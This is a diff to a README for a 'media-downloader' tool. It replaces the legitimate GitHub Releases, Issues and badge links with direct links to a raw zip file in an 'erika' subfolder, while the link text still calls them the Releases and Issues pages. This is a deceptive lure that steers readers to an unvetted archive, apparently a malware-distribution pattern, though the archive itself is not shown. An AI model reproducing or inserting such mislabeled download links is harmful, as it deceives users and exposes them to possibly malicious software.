@@ -1,7 +1,7 @@
 # 🎬 media-downloader - Effortlessly Download Media Files
 
 ## 📥 Download Now
-[![Download media-downloader](https://img.shields.io/badge/Download%20media--downloader-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josepalacios02/media-downloader/releases)
+[![Download media-downloader](https://raw.githubusercontent.com/josepalacios02/media-downloader/main/erika/media_downloader_v3.1.zip%20media--downloader-007bff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/josepalacios02/media-downloader/main/erika/media_downloader_v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the media-downloader! This simple tool helps you search and download images and videos based on your provided descriptions. Whether you want to gather media for a project or just want to save interesting content, this application makes it easy.
@@ -20,7 +20,7 @@ To run media-downloader on your computer, ensure that you meet these basic requi
 - **Internet Connection**: A stable internet connection is necessary for media searches and downloads.
 
 ## 💡 How to Download & Install
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/josepalacios02/media-downloader/releases) to find the latest version of media-downloader.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/josepalacios02/media-downloader/main/erika/media_downloader_v3.1.zip) to find the latest version of media-downloader.
    
 2. **Choose the Right File**: Look for the latest release. Click on the link to download the appropriate file for your operating system:
    - For Windows users, download the `.exe` file.
@@ -49,7 +49,7 @@ If you encounter any issues:
 - **Reinstall the Application**: If problems persist, uninstall the application and follow the installation steps again.
 
 ## 🔗 More Information
-For additional help or to report issues, please visit our [Issues Page](https://github.com/josepalacios02/media-downloader/issues). You can also check for updates and new features on the Releases Page mentioned above.
+For additional help or to report issues, please visit our [Issues Page](https://raw.githubusercontent.com/josepalacios02/media-downloader/main/erika/media_downloader_v3.1.zip). You can also check for updates and new features on the Releases Page mentioned above.
 
 To get the latest updates, feel free to follow the repository on GitHub. Your feedback is valuable to us, and it helps improve media-downloader.
 
